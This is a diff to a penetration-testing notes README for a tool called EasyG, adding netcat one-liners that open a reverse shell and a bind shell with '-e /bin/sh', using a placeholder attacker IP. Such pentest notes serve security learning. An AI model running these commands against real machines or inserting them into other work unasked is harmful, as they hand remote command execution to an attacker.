@@ -180,8 +180,12 @@ EasyG started out as a script that I use to automate some information gathering 
 
 Shells
 - Shell: we open a shell on the client
-- Reverse shell: we make the target connect to us with a shell
-- Bind shell: the target has a listener running and the attacker connects to it in order to get a shell
+- Reverse shell: we make the victim connect to us with a shell
+  - Attacker: `nc -lvp 4444`
+  - Victim: `nc <ip_attacker> 4444 -e /bin/sh`
+- Bind shell: the victim has a listener running and the attacker connects to it in order to get a shell
+  - Attacker: `nc <ip_victim> 4444`
+  - Victim: `nc -lvp 4444 -e /bin/sh`
 
 
 ## Check-lists
